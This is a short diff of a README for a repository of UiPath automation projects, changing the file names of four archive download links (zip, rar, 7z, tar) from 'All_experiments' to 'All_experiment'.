@@ -29,10 +29,10 @@ This repository contains various UiPath automation projects, covering a wide ran
 
 To download all experiments as a single compressed file, pick your preferred format from the options below:
 
-- [**All_experiments.zip**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiments.zip)
-- [**All_experiments.rar**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiments.rar)
-- [**All_experiments.7z**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiments.7z)
-- [**All_experiments.tar**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiments.tar)
+- [**All_experiment.zip**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiment.zip)
+- [**All_experiment.rar**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiment.rar)
+- [**All_experiment.7z**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiment.7z)
+- [**All_experiment.tar**](https://github.com/Paul-KSI/UiPath-Projects/raw/main/All_experiment.tar)
 
 Clicking any of the links above will start the download immediately.
 
